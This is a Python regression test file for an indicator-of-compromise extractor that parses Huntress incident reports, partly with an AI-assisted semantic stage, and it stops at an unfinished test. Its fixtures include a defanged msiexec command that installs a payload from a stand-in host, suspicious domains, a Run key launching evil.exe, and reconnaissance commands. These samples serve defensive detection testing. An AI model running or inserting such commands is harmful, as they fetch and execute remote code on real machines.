"""Regression tests using the gitignored Huntress example corpus.

Populate example_reports/huntress locally to enable corpus-backed cases.
"""

import importlib.util
import os
import sys
import types
import unittest


REPO_ROOT = os.path.dirname(os.path.dirname(__file__))
HUNTRESS_REPORT_DIR = os.path.join(REPO_ROOT, 'example_reports', 'huntress')


def _has_huntress_reports(*names):
    return all(os.path.exists(os.path.join(HUNTRESS_REPORT_DIR, name)) for name in names)


class IOCHuntressExtractorRegressionTestCase(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        fake_utils = types.ModuleType('utils')
        fake_utils.__path__ = []
        fake_utils_ai = types.ModuleType('utils.ai')
        fake_utils_ai.__path__ = []
        fake_utils_ai_router = types.ModuleType('utils.ai.router')
        fake_utils_ai_router.invoke_json = (
            lambda *args, **kwargs: kwargs['provider'].generate_json(**kwargs)
            if kwargs.get('provider') and hasattr(kwargs['provider'], 'generate_json')
            else {}
        )
        fake_utils_ai_router.invoke_text = (
            lambda *args, **kwargs: kwargs['provider'].generate_text(**kwargs)
            if kwargs.get('provider') and hasattr(kwargs['provider'], 'generate_text')
            else ""
        )
        fake_ai_training = types.ModuleType('utils.ai_training')
        fake_ai_training.build_role_system_prompt = (
            lambda route_name, extra_instructions='': extra_instructions
        )

        cls._previous_utils = sys.modules.get('utils')
        cls._previous_utils_ai = sys.modules.get('utils.ai')
        cls._previous_utils_ai_router = sys.modules.get('utils.ai.router')
        cls._previous_ai_training = sys.modules.get('utils.ai_training')
        sys.modules['utils'] = fake_utils
        sys.modules['utils.ai'] = fake_utils_ai
        sys.modules['utils.ai.router'] = fake_utils_ai_router
        sys.modules['utils.ai_training'] = fake_ai_training

        module_path = os.path.join(REPO_ROOT, 'utils', 'ioc_extractor.py')
        spec = importlib.util.spec_from_file_location('ioc_extractor_under_test', module_path)
        cls.extractor_module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(cls.extractor_module)
        finally:
            if cls._previous_utils is not None:
                sys.modules['utils'] = cls._previous_utils
            else:
                sys.modules.pop('utils', None)

            if cls._previous_utils_ai is not None:
                sys.modules['utils.ai'] = cls._previous_utils_ai
            else:
                sys.modules.pop('utils.ai', None)

            if cls._previous_utils_ai_router is not None:
                sys.modules['utils.ai.router'] = cls._previous_utils_ai_router
            else:
                sys.modules.pop('utils.ai.router', None)

            if cls._previous_ai_training is not None:
                sys.modules['utils.ai_training'] = cls._previous_ai_training
            else:
                sys.modules.pop('utils.ai_training', None)

    def _read_report(self, name):
        report_path = os.path.join(HUNTRESS_REPORT_DIR, name)
        with open(report_path, 'r', encoding='utf-8') as handle:
            return handle.read()

    def _run_semantic_stage_with_provider(self, provider, report_text, deterministic=None, **kwargs):
        return self.extractor_module._semantic_stage.run_semantic_stage(
            provider,
            report_text,
            deterministic or {'iocs': {}, 'extraction_summary': {}},
            max_chunk_chars=kwargs.get('max_chunk_chars', 4000),
            max_response_tokens=kwargs.get('max_response_tokens', 512),
            validate_result=self.extractor_module._validate_ai_result_metadata,
            prepare_payload=self.extractor_module._prepare_ai_extraction_payload,
            filter_payload_for_task=self.extractor_module._filter_semantic_payload_for_task,
            normalize_extraction=self.extractor_module._normalize_ai_extraction,
        )

    def _process_with_fake_known_systems(self, extraction):
        previous_known_system = sys.modules.get('models.known_system')
        previous_ioc = sys.modules.get('models.ioc')

        class FakeKnownSystem:
            @staticmethod
            def find_by_hostname_or_alias(_hostname, case_id=None):
                return None, None

        class FakeIOC:
            @staticmethod
            def find_by_value(_value, _ioc_type, case_id=None):
                return None

        fake_known_system_module = types.ModuleType('models.known_system')
        fake_known_system_module.KnownSystem = FakeKnownSystem
        fake_ioc_module = types.ModuleType('models.ioc')
        fake_ioc_module.IOC = FakeIOC
        fake_ioc_module.detect_match_type = lambda _value, _ioc_type: 'substring'
        fake_ioc_module.get_match_type_recommendation = lambda _value, _ioc_type: {'reason': 'test'}
        sys.modules['models.known_system'] = fake_known_system_module
        sys.modules['models.ioc'] = fake_ioc_module
        try:
            return self.extractor_module.process_extraction_for_import(
                extraction=extraction,
                case_id=42,
                username='tester',
            )
        finally:
            if previous_known_system is not None:
                sys.modules['models.known_system'] = previous_known_system
            else:
                sys.modules.pop('models.known_system', None)
            if previous_ioc is not None:
                sys.modules['models.ioc'] = previous_ioc
            else:
                sys.modules.pop('models.ioc', None)

    def _semantic_result(self, data, raw_response=None, finish_reason='stop', **extra):
        result = {
            'success': True,
            'data': data,
            'raw_response': raw_response if raw_response is not None else self.extractor_module.json.dumps(data),
            'finish_reason': finish_reason,
            'model': 'fake-semantic-model',
            'json_valid_initially': not bool(extra.get('response_repaired')),
            'json_repair_applied': bool(extra.get('response_repaired')),
            'response_repaired': bool(extra.get('response_repaired')),
            'repair_reason': extra.get('repair_reason'),
            'json_repair_reason': extra.get('json_repair_reason') or extra.get('repair_reason'),
        }
        result.update(extra)
        return result

    class _SequencedSemanticProvider:
        model = 'fake-semantic-model'

        def __init__(self, responses_by_task):
            self.responses_by_task = {
                task: list(responses)
                for task, responses in responses_by_task.items()
            }
            self.calls_by_task = {}
            self.prompts_by_task = {}
            self.max_tokens_by_task = {}

        def provider_type(self):
            return 'test'

        def get_provider_display(self):
            return 'Test Provider'

        def get_batch_config(self):
            return {'context_window': 16384, 'max_tokens': 4096}

        def generate_json(self, **kwargs):
            prompt = kwargs.get('prompt', '')
            task_name = next(
                (
                    name for name in (
                        'semantic_identity_and_auth',
                        'semantic_process_relationships',
                        'semantic_persistence_actions',
                    )
                    if name in prompt
                ),
                'unknown',
            )
            self.calls_by_task[task_name] = self.calls_by_task.get(task_name, 0) + 1
            self.prompts_by_task.setdefault(task_name, []).append(prompt)
            self.max_tokens_by_task.setdefault(task_name, []).append(kwargs.get('max_tokens'))
            responses = self.responses_by_task.get(task_name) or []
            if not responses:
                return {'success': False, 'error': f'no response configured for {task_name}'}
            if len(responses) > 1:
                return responses.pop(0)
            return responses[0]

    @unittest.skipUnless(
        _has_huntress_reports('report2.txt', 'report4.txt', 'report8.txt'),
        'requires gitignored Huntress example_reports corpus',
    )
    def test_regex_extractor_strips_huntress_sha256_suffixes_from_file_paths(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        for report_name in ('report2.txt', 'report4.txt', 'report8.txt'):
            with self.subTest(report=report_name):
                file_paths = {
                    item['value']
                    for item in extractor.extract(self._read_report(report_name))['iocs']['file_paths']
                }
                self.assertTrue(file_paths)
                self.assertFalse(
                    any('+ sha256' in path.lower() for path in file_paths),
                    msg=f"Unexpected Huntress sha256 suffix remained in {report_name}",
                )

    def test_regex_extractor_moves_quarantine_note_into_context(self):
        extractor = self.extractor_module.RegexIOCExtractor()
        report = (
            'File System\n'
            'FILE: C:\\Users\\robertss\\Downloads\\p11341.exe (Quarantined by Microsoft Defender)\n'
        )

        file_paths = extractor.extract(report)['iocs']['file_paths']

        self.assertEqual(len(file_paths), 1)
        self.assertEqual(file_paths[0]['value'], r'C:\Users\robertss\Downloads\p11341.exe')
        self.assertEqual(file_paths[0]['context'], 'Quarantined by Microsoft Defender')

    def test_ai_file_name_normalizer_strips_huntress_annotations(self):
        normalize_file_name = self.extractor_module._normalize_ai_file_name

        self.assertEqual(
            normalize_file_name('document.pdf + sha256: abc123'),
            'document.pdf',
        )
        self.assertEqual(
            normalize_file_name('p11341.exe (Quarantined by Microsoft Defender)'),
            'p11341.exe',
        )

    def test_alias_generation_uses_clean_file_path_basename(self):
        alias_result = self.extractor_module.generate_ioc_with_aliases(
            r'C:\Users\robertss\Downloads\document.pdf + sha256: abc123',
            'File Path',
        )

        self.assertEqual(alias_result['primary_value'], 'document.pdf')
        self.assertEqual(
            alias_result['aliases'],
            [r'c:\users\robertss\downloads\document.pdf'],
        )

    @unittest.skipUnless(
        _has_huntress_reports('report50.txt'),
        'requires gitignored Huntress example_reports corpus',
    )
    def test_regex_extractor_defangs_huntress_urls_and_domains_from_sample_reports(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        report50 = extractor.extract(self._read_report('report50.txt'))
        urls = {item['value'] for item in report50['iocs']['urls']}
        domains = {item['value'] for item in report50['iocs']['domains']}

        self.assertIn('https://teuehebaji.de/ture.html', urls)
        self.assertIn('yoc736.ikhelp.top', domains)

    def test_public_derived_indicator_helper_extracts_defanged_context_iocs(self):
        candidates = self.extractor_module.extract_derived_indicator_candidates(
            'msiexec.exe',
            context_values=[
                '"C:\\Windows\\System32\\msiexec.exe" /i "hxxps[:]//bad[.]example/payload.exe"',
            ],
        )

        self.assertIn(
            {
                'source_value': '"C:\\Windows\\System32\\msiexec.exe" /i "hxxps[:]//bad[.]example/payload.exe"',
                'extracted_value': 'https://bad.example/payload.exe',
                'extracted_type': 'URL',
            },
            candidates,
        )

    @unittest.skipUnless(
        _has_huntress_reports('report20.txt'),
        'requires gitignored Huntress example_reports corpus',
    )
    def test_regex_extractor_preserves_huntress_threat_names_for_name_enrichment(self):
        extractor = self.extractor_module.RegexIOCExtractor()

        report20 = extractor.extract(self._read_report('report20.txt'))
        threat_names = set(report20['iocs']['threat_names'])

        self.assertIn('Trojan:JS/Trickbot.S!MSR', threat_names)

    def test_chunk_report_for_ai_keeps_late_sections_instead_of_front_only_truncation(self):
        chunk_report = self.extractor_module._chunk_report_for_ai
        report = (
            "Overview\n--------\n"
            + ("A" * 9000)
            + "\n\nIndicators\n----------\n"
            + ("B" * 9000)
            + "\n\nLate Evidence\n-------------\n"
            + "unique-indicator.example\n"
        )

        chunks = chunk_report(report, 10000)

        self.assertGreater(len(chunks), 1)
        self.assertTrue(any('Late Evidence' in chunk for chunk in chunks))
        self.assertTrue(any('unique-indicator.example' in chunk for chunk in chunks))

    def test_split_large_section_blocks_include_overlap_for_boundary_context(self):
        split_blocks = self.extractor_module._split_large_section_blocks
        marker = 'shared-marker.example'
        paragraph = ('A' * 960) + marker + ('B' * 960)

        blocks = split_blocks('Evidence', paragraph, 1200)

        self.assertGreater(len(blocks), 1)
        self.assertGreaterEqual(
            sum(1 for block in blocks if marker in block['text']),
            2,
        )
        self.assertTrue(any(block['overlap_applied'] for block in blocks[1:]))

    def test_prepare_ai_extraction_payload_repairs_missing_keys_via_review_path(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        review_calls = []
        original_review = self.extractor_module._ai_review.review_structured_output

        def fake_review(provider, **kwargs):
            review_calls.append(kwargs['payload'])
            return kwargs['payload']

        self.extractor_module._ai_review.review_structured_output = fake_review
        try:
            payload, meta = prepare_payload(
                provider=object(),
                payload={
                    'affected_hosts': ['HOST-A'],
                    'unexpected': ['drop-me'],
                },
                max_tokens=2000,
            )
        finally:
            self.extractor_module._ai_review.review_structured_output = original_review

        self.assertTrue(meta['review_applied'])
        self.assertEqual(len(review_calls), 1)
        self.assertTrue(self.extractor_module._is_valid_ioc_schema(payload))
        self.assertNotIn('unexpected', payload)
        self.assertEqual(payload['affected_hosts'], ['HOST-A'])
        self.assertIn('network_iocs', payload)

    def test_ioc_extractor_keeps_ai_modules_lazy_until_ai_path_is_used(self):
        fake_utils = types.ModuleType('utils')
        fake_utils.__path__ = []
        fake_utils_ai = types.ModuleType('utils.ai')
        fake_utils_ai.__path__ = []
        fake_utils_ai_router = types.ModuleType('utils.ai.router')
        fake_utils_ai_router.invoke_json = (
            lambda *args, **kwargs: kwargs['provider'].generate_json(**kwargs)
            if kwargs.get('provider') and hasattr(kwargs['provider'], 'generate_json')
            else {}
        )
        fake_utils_ai_router.invoke_text = (
            lambda *args, **kwargs: kwargs['provider'].generate_text(**kwargs)
            if kwargs.get('provider') and hasattr(kwargs['provider'], 'generate_text')
            else ""
        )
        fake_ai_training = types.ModuleType('utils.ai_training')
        fake_ai_training.build_role_system_prompt = (
            lambda route_name, extra_instructions='': extra_instructions
        )

        previous_utils = sys.modules.get('utils')
        previous_utils_ai = sys.modules.get('utils.ai')
        previous_utils_ai_router = sys.modules.get('utils.ai.router')
        previous_ai_training = sys.modules.get('utils.ai_training')
        sys.modules['utils'] = fake_utils
        sys.modules['utils.ai'] = fake_utils_ai
        sys.modules['utils.ai.router'] = fake_utils_ai_router
        sys.modules['utils.ai_training'] = fake_ai_training
        module_path = os.path.join(REPO_ROOT, 'utils', 'ioc_extractor.py')
        spec = importlib.util.spec_from_file_location('ioc_extractor_lazy_under_test', module_path)
        lazy_module = importlib.util.module_from_spec(spec)
        try:
            spec.loader.exec_module(lazy_module)
        finally:
            if previous_utils is not None:
                sys.modules['utils'] = previous_utils
            else:
                sys.modules.pop('utils', None)
            if previous_utils_ai is not None:
                sys.modules['utils.ai'] = previous_utils_ai
            else:
                sys.modules.pop('utils.ai', None)
            if previous_utils_ai_router is not None:
                sys.modules['utils.ai.router'] = previous_utils_ai_router
            else:
                sys.modules.pop('utils.ai.router', None)
            if previous_ai_training is not None:
                sys.modules['utils.ai_training'] = previous_ai_training
            else:
                sys.modules.pop('utils.ai_training', None)

        self.assertIsNone(lazy_module._ai_review._loaded_module)
        self.assertIsNone(lazy_module._semantic_stage._loaded_module)
        self.assertIsNone(lazy_module._audit_stage._loaded_module)

        extractor = lazy_module.RegexIOCExtractor()
        extractor.extract('No IOCs here')

        self.assertIsNone(lazy_module._ai_review._loaded_module)
        self.assertIsNone(lazy_module._semantic_stage._loaded_module)
        self.assertIsNone(lazy_module._audit_stage._loaded_module)

        payload = {'affected_hosts': ['HOST-A']}
        original_review = lazy_module._ai_review.review_structured_output
        lazy_module._ai_review.review_structured_output = lambda _provider, **kwargs: kwargs['payload']
        try:
            lazy_module._prepare_ai_extraction_payload(
                provider=object(),
                payload=payload,
                max_tokens=2000,
            )
        finally:
            lazy_module._ai_review.review_structured_output = original_review

        self.assertIsNotNone(lazy_module._ai_review._loaded_module)

    def test_prepare_ai_extraction_payload_repairs_malformed_persistence_shape(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        review_calls = []
        original_review = self.extractor_module._ai_review.review_structured_output

        def fake_review(provider, **kwargs):
            review_calls.append(kwargs['payload'])
            return kwargs['payload']

        self.extractor_module._ai_review.review_structured_output = fake_review
        try:
            payload, meta = prepare_payload(
                provider=object(),
                payload={
                    'affected_hosts': [],
                    'affected_users': [],
                    'network_iocs': {'ipv4': [], 'ipv6': [], 'domains': [], 'urls': [], 'cloudflare_tunnels': []},
                    'file_iocs': {'hashes': [], 'file_paths': [], 'file_names': []},
                    'process_iocs': {'commands': [], 'services': [], 'scheduled_tasks': []},
                    'persistence_iocs': [],
                    'registry': [],
                    'credential_theft_indicators': [],
                    'authentication_iocs': {'compromised_users': [], 'created_users': [], 'passwords_observed': []},
                    'vulnerability_iocs': {'cves': [], 'webshells': []},
                    'raw_artifacts': {'encoded_powershell': [], 'vnc_connection_ids': [], 'screenconnect_ids': []},
                },
                max_tokens=2000,
            )
        finally:
            self.extractor_module._ai_review.review_structured_output = original_review

        self.assertTrue(meta['review_applied'])
        self.assertEqual(len(review_calls), 1)
        self.assertTrue(self.extractor_module._is_valid_ioc_schema(payload))
        self.assertEqual(payload['persistence_iocs']['registry'], [])
        self.assertEqual(payload['persistence_iocs']['credential_theft_indicators'], [])
        self.assertNotIn('registry', payload)
        self.assertNotIn('credential_theft_indicators', payload)

    def test_prepare_ai_extraction_payload_skips_source_less_review_for_semantic_task_leakage(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        review_calls = []
        original_review = self.extractor_module._ai_review.review_structured_output

        def fake_review(provider, **kwargs):
            review_calls.append(kwargs['payload'])
            return kwargs['payload']

        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['file_iocs']['hashes'] = [
            {
                'value': 'b4498b-3d47-4ecd-b98c-312e297bd707',
                'type': 'sha256',
                'filename': 'csc.exe',
            }
        ]
        payload['persistence_iocs']['registry'] = [
            {'key': r'HKCU\\Software\\Bad', 'value_name': 'Run', 'value_data': 'evil.exe'}
        ]

        self.extractor_module._ai_review.review_structured_output = fake_review
        try:
            repaired, meta = prepare_payload(
                provider=object(),
                payload=payload,
                max_tokens=2000,
                task_name='semantic_process_relationships',
            )
        finally:
            self.extractor_module._ai_review.review_structured_output = original_review

        self.assertFalse(meta['review_applied'])
        self.assertEqual(len(review_calls), 0)
        self.assertEqual(meta['review_skipped_reason'], 'semantic_task_requires_source_evidence')
        self.assertTrue(
            any(reason.startswith('invalid_hash:') for reason in meta['semantic_review_reasons'])
        )
        self.assertTrue(
            any(reason == 'task_field_leakage:persistence_iocs' for reason in meta['semantic_review_reasons'])
        )
        self.assertTrue(self.extractor_module._is_valid_ioc_schema(repaired))

    def test_prepare_ai_extraction_payload_skips_review_for_schema_empty_unowned_sections(self):
        prepare_payload = self.extractor_module._prepare_ai_extraction_payload
        review_calls = []
        original_review = self.extractor_module._ai_review.review_structured_output

        def fake_review(provider, **kwargs):
            review_calls.append(kwargs['payload'])
            return kwargs['payload']

        payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        payload['affected_hosts'] = ['ATN61841']
        payload['process_iocs']['commands'] = [
            {
                'full_command': '"C:\\Windows\\System32\\cmd.exe" /c whoami',
                'executable': 'C:\\Windows\\System32\\cmd.exe',
                'parent_process': 'C:\\Windows\\System32\\services.exe',
                'user': 'SYSTEM',
                'pid': '1234',
            }
        ]

        self.extractor_module._ai_review.review_structured_output = fake_review
        try:
            repaired, meta = prepare_payload(
                provider=object(),
                payload=payload,
                max_tokens=2000,
                task_name='semantic_process_relationships',
            )
        finally:
            self.extractor_module._ai_review.review_structured_output = original_review

        self.assertFalse(meta['review_applied'])
        self.assertEqual(meta['semantic_review_reasons'], [])
        self.assertFalse(review_calls)
        self.assertEqual(len(repaired['process_iocs']['commands']), 1)

    def test_validate_ai_result_metadata_rejects_non_stop_finishes_and_repetition(self):
        validate = self.extractor_module._validate_ai_result_metadata
        repeated = ('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' * 3) + ' tail'
        repeated = repeated[:90] + repeated[:90] + repeated[:90]

        self.assertEqual(
            validate({'raw_response': '{"ok": true}', 'finish_reason': 'length'}),
            "finish_reason was 'length'",
        )
        self.assertEqual(
            validate({'raw_response': repeated, 'finish_reason': 'stop'}),
            'repetitive output detected before repair',
        )
        self.assertEqual(
            validate({'raw_response': '   ', 'finish_reason': 'stop'}),
            'empty content from provider',
        )

    def test_semantic_stage_fail_fast_rejects_non_stop_finish_reason_before_review(self):
        stage = self.extractor_module._semantic_stage.run_semantic_stage
        task_payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
        review_calls = []

        class FakeProvider:
            def generate_json(self, **_kwargs):
                return {
                    'success': True,
                    'data': task_payload,
                    'raw_response': '{"affected_hosts":[]}',
                    'finish_reason': 'length',
                }

        def validate_result(ai_result):
            return self.extractor_module._validate_ai_result_metadata(ai_result)

        def prepare_payload(*args, **kwargs):
            review_calls.append(kwargs)
            return task_payload, {'review_applied': False}

        result = stage(
            FakeProvider(),
            "Users\n--------\nAlice logged in.\n",
            {'iocs': {}, 'extraction_summary': {}},
            max_chunk_chars=1200,
            max_response_tokens=512,
            validate_result=validate_result,
            prepare_payload=prepare_payload,
            filter_payload_for_task=lambda _task, payload: payload,
            normalize_extraction=lambda payload, _report: payload,
        )

        self.assertFalse(result['normalized_results'])
        self.assertGreaterEqual(len(result['task_failures']), 1)
        self.assertTrue(
            all(
                "finish_reason" in str(failure.get('error', ''))
                and "'length'" in str(failure.get('error', ''))
                for failure in result['task_failures']
            )
        )

    def test_semantic_item_validation_retries_invalid_process_item(self):
        stage = self.extractor_module._semantic_stage.run_semantic_stage
        invalid_payload = {
            'commands': [{'whatever': 'something'}],
            'services': [],
            'scheduled_tasks': [],
        }
        valid_payload = {
            'commands': [
                {
                    'full_command': 'cmd.exe /c whoami',
                    'executable': 'cmd.exe',
                    'parent_process': None,
                    'user': None,
                    'pid': None,
                    'evidence': 'Command: cmd.exe /c whoami',
                    'evidence_origin': 'observed',
                }
            ],
            'services': [],
            'scheduled_tasks': [],
        }
        provider = self._SequencedSemanticProvider({
            'semantic_process_relationships': [
                self._semantic_result(invalid_payload),
                self._semantic_result(valid_payload),
            ],
        })

        result = stage(
            provider,
            'Process Evidence\n----------------\nCommand: cmd.exe /c whoami',
            {'iocs': {}, 'extraction_summary': {}},
            max_chunk_chars=4000,
            max_response_tokens=512,
            validate_result=self.extractor_module._validate_ai_result_metadata,
            prepare_payload=self.extractor_module._prepare_ai_extraction_payload,
            filter_payload_for_task=self.extractor_module._filter_semantic_payload_for_task,
            normalize_extraction=self.extractor_module._normalize_ai_extraction,
        )

        self.assertFalse(result['task_failures'])
        self.assertEqual(result['task_provenance'][0]['retry_count'], 1)
        self.assertIn('item validation failed', result['task_provenance'][0]['attempts'][0]['error'])
        self.assertEqual(result['normalized_results'][0]['iocs']['commands'][0]['value'], 'cmd.exe /c whoami')

    def test_semantic_stage_accepts_clean_empty_json_without_repair_or_retry(self):
        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
        provider = self._SequencedSemanticProvider({
            'semantic_persistence_actions': [
                self._semantic_result(payload, raw_response='{"registry":[],"credential_theft_indicators":[],"webshells":[]}')
            ],
        })

        result = self._run_semantic_stage_with_provider(
            provider,
            "Registry\n--------\nNo registry modification or web shell was established.",
        )

        self.assertEqual(provider.calls_by_task['semantic_persistence_actions'], 1)
        self.assertEqual(result['task_failures'], [])
        self.assertEqual(len(result['normalized_results']), 1)
        summary = result['normalized_results'][0]['extraction_summary']
        self.assertFalse(summary['json_repair_applied'])
        self.assertEqual(summary['semantic_retry_count'], 0)
        self.assertEqual(result['normalized_results'][0]['iocs']['registry_keys'], [])

    def test_semantic_stage_records_prefix_repair_metadata_for_empty_persistence(self):
        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
        provider = self._SequencedSemanticProvider({
            'semantic_persistence_actions': [
                self._semantic_result(
                    payload,
                    raw_response='to=user<|message|>{"registry":[],"credential_theft_indicators":[],"webshells":[]}',
                    response_repaired=True,
                    repair_reason='provider_prefix',
                    json_valid_initially=False,
                    json_repair_applied=True,
                    json_repair_reason='provider_prefix',
                )
            ],
        })

        result = self._run_semantic_stage_with_provider(
            provider,
            "Registry\n--------\nNo registry modification or web shell was established.",
        )

        self.assertFalse(result['task_failures'])
        summary = result['normalized_results'][0]['extraction_summary']
        self.assertFalse(summary['json_valid_initially'])
        self.assertTrue(summary['json_repair_applied'])
        self.assertEqual(summary['json_repair_reason'], 'provider_prefix')
        self.assertEqual(result['normalized_results'][0]['iocs']['registry_keys'], [])

    def test_semantic_stage_retries_only_failed_pass_after_truncated_empty_output(self):
        identity_payload = {
            'affected_users': [{'username': 'ACMATCORP\\CPalmero', 'sid': 'S-1-5-21-1', 'evidence': 'User'}],
            'credential_exposure_users': [],
            'compromised_users': [],
            'created_users': [],
            'passwords_observed': [],
        }
        process_payload = {
            'commands': [
                {
                    'full_command': 'powershell.exe -c calc',
                    'executable': 'powershell.exe',
                    'parent_process': 'explorer.exe',
                    'user': 'CPalmero',
                    'pid': '1234',
                    'evidence': 'powershell.exe -c calc',
                    'evidence_origin': 'observed',
                }
            ],
            'services': [],
            'scheduled_tasks': [],
        }
        provider = self._SequencedSemanticProvider({
            'semantic_identity_and_auth': [self._semantic_result(identity_payload)],
            'semantic_process_relationships': [
                self._semantic_result({}, raw_response='', finish_reason='length'),
                self._semantic_result(process_payload),
            ],
        })

        result = self._run_semantic_stage_with_provider(
            provider,
            "User\n--------\nUser ACMATCORP\\CPalmero SID S-1-5-21-1.\n\n"
            "Process\n--------\npowershell.exe -c calc parent explorer.exe user CPalmero pid 1234.",
        )

        self.assertEqual(provider.calls_by_task['semantic_identity_and_auth'], 1)
        self.assertEqual(provider.calls_by_task['semantic_process_relationships'], 2)
        self.assertEqual(result['task_failures'], [])
        process_provenance = [
            item for item in result['task_provenance']
            if item['task'] == 'semantic_process_relationships'
        ][0]
        self.assertEqual(process_provenance['retry_count'], 1)
        self.assertEqual(process_provenance['attempts'][0]['finish_reason'], 'length')
        self.assertTrue(process_provenance['attempts'][0]['empty_content'])
        self.assertGreaterEqual(provider.max_tokens_by_task['semantic_process_relationships'][1], 512)

    def test_semantic_stage_retry_exhaustion_is_failure_not_empty_result(self):
        provider = self._SequencedSemanticProvider({
            'semantic_process_relationships': [
                self._semantic_result({}, raw_response='', finish_reason='length'),
                self._semantic_result({}, raw_response='', finish_reason='length'),
            ],
        })

        result = self._run_semantic_stage_with_provider(
            provider,
            "Process\n--------\nPowerShell execution was reported.",
        )

        self.assertEqual(result['normalized_results'], [])
        self.assertEqual(len(result['task_failures']), 1)
        failure = result['task_failures'][0]
        self.assertEqual(failure['task'], 'semantic_process_relationships')
        self.assertEqual(failure['finish_reason'], 'length')
        self.assertTrue(failure['empty_content'])
        self.assertFalse(failure['final_success'])
        self.assertIn('finish_reason', failure['error'])

    def test_semantic_stage_ambiguous_json_failure_uses_retry_path(self):
        payload = {'registry': [], 'credential_theft_indicators': [], 'webshells': []}
        provider = self._SequencedSemanticProvider({
            'semantic_persistence_actions': [
                {
                    'success': False,
                    'error': 'Failed to parse JSON response',
                    'raw_response': '{"registry":[]}{"registry":[{"key":"HKCU\\\\Bad"}]}',
                    'finish_reason': 'stop',
                    'json_valid_initially': False,
                    'json_repair_applied': False,
                    'json_repair_error': 'ambiguous_multiple_json_objects',
                    'model': 'fake-semantic-model',
                },
                self._semantic_result(payload),
            ],
        })

        result = self._run_semantic_stage_with_provider(
            provider,
            "Registry\n--------\nNo registry modification or web shell was established.",
        )

        self.assertEqual(result['task_failures'], [])
        provenance = result['task_provenance'][0]
        self.assertEqual(provenance['retry_count'], 1)
        self.assertEqual(provenance['attempts'][0]['json_repair_error'], 'ambiguous_multiple_json_objects')

    def test_run_ioc_pipeline_exposes_all_semantic_failures_when_no_pass_succeeds(self):
        provider = self._SequencedSemanticProvider({
            'semantic_process_relationships': [
                self._semantic_result({}, raw_response='', finish_reason='length'),
                self._semantic_result({}, raw_response='', finish_reason='length'),
            ],
        })

        extraction, used_ai = self.extractor_module.run_ioc_pipeline_with_provider(
            "Process\n--------\nPowerShell execution was reported.",
            provider,
            pipeline_mode='semantic',
            model_name='fake-semantic-model',
        )

        summary = extraction['extraction_summary']
        self.assertTrue(used_ai)
        self.assertEqual(summary['method'], 'deterministic_plus_semantic_degraded')
        self.assertTrue(summary['ai_degraded'])
        self.assertEqual(summary['semantic_task_successes'], 0)
        self.assertEqual(len(summary['semantic_task_failures']), 1)

    def test_extract_iocs_with_ai_marks_partial_chunk_failure_as_degraded(self):
        original_semantic_runner = self.extractor_module._semantic_stage.run_semantic_stage
        previous_feature_module = sys.modules.get('utils.feature_availability')
        previous_provider_module = sys.modules.get('utils.ai_providers')

        fake_feature_module = types.ModuleType('utils.feature_availability')

        class FeatureAvailability:
            @staticmethod
            def is_ai_enabled():
                return True

        fake_feature_module.FeatureAvailability = FeatureAvailability

        class FakeProvider:
            def __init__(self, module):
                self.model = 'fake-ioc-model'
                self._module = module
                self.calls = 0

            def get_batch_config(self):
                return {'context_window': 16384, 'max_tokens': 4000}

            def generate_json(self, **_kwargs):
                self.calls += 1
                if self.calls == 1:
                    payload = self._module._ioc_contract.build_empty_ioc_extraction()
                    payload['affected_hosts'] = ['HOST-A']
                    payload['network_iocs']['domains'] = [{'value': 'ai-only.example', 'context': 'chunk one'}]
                    return {'success': True, 'data': payload, 'model': self.model}
                return {'success': False, 'error': 'simulated chunk failure'}

        fake_provider = FakeProvider(self.extractor_module)
        fake_provider_module = types.ModuleType('utils.ai_providers')
        fake_provider_module.get_llm_provider = lambda **_kwargs: fake_provider

        def fake_semantic_stage(provider, report_text, deterministic_extraction, **_kwargs):
            payload = self.extractor_module._ioc_contract.build_empty_ioc_extraction()
            payload['affected_hosts'] = ['HOST-A']
            payload['network_iocs']['domains'] = [{'value': 'ai-only.example', 'context': 'semantic chunk'}]
            normalized = self.extractor_module._normalize_ai_extraction(payload, report_text)
            return {
                'normalized_results': [normalized],
                'task_failures': [{'task': 'semantic_process_relationships', 'chunk': 2, 'error': 'simulated chunk failure'}],
                'task_provenance': [{'task': 'semantic_identity_and_auth', 'sections': ['Overview'], 'chunk': 1, 'chunk_count': 2}],
                'schema_reviews': 0,
                'planned_tasks': ['semantic_identity_and_auth', 'semantic_process_relationships'],
            }

        self.extractor_module._semantic_stage.run_semantic_stage = fake_semantic_stage
        sys.modules['utils.feature_availability'] = fake_feature_module
        sys.modules['utils.ai_providers'] = fake_provider_module

        try:
            extraction, used_ai = self.extractor_module.extract_iocs_with_ai('evil.example')
        finally:
            self.extractor_module._semantic_stage.run_semantic_stage = original_semantic_runner
            if previous_feature_module is not None:
                sys.modules['utils.feature_availability'] = previous_feature_module
            else:
                sys.modules.pop('utils.feature_availability', None)
            if previous_provider_module is not None:
                sys.modules['utils.ai_providers'] = previous_provider_module
            else:
                sys.modules.pop('utils.ai_providers', None)

        self.assertTrue(used_ai)
        self.assertEqual(extraction['extraction_summary']['method'], 'deterministic_plus_semantic_degraded')
        self.assertTrue(extraction['extraction_summary']['ai_degraded'])
        self.assertEqual(len(extraction['extraction_summary']['semantic_task_failures']), 1)
        self.assertEqual(extraction['extraction_summary']['semantic_task_successes'], 1)
        self.assertIn('HOST-A', extraction['iocs']['hostnames'])
        self.assertTrue(
            any(item['value'] == 'ai-only.example' for item in extraction['iocs']['domains'])
        )

    def test_resolve_ai_chunk_config_scales_up_for_large_context_models(self):
        resolve_config = self.extractor_module._resolve_ai_chunk_config

        local_config = resolve_config({'context_window': 16384, 'max_tokens': 4000})
        large_config = resolve_config({'context_window': 128000, 'max_tokens': 4096})

        self.assertGreater(large_config['max_chunk_chars'], local_config['max_chunk_chars'])
        self.assertEqual(local_config['max_response_tokens'], 4000)

    def test_semantic_task_plan_does_not_add_residual_pass_for_unmapped_sections(self):
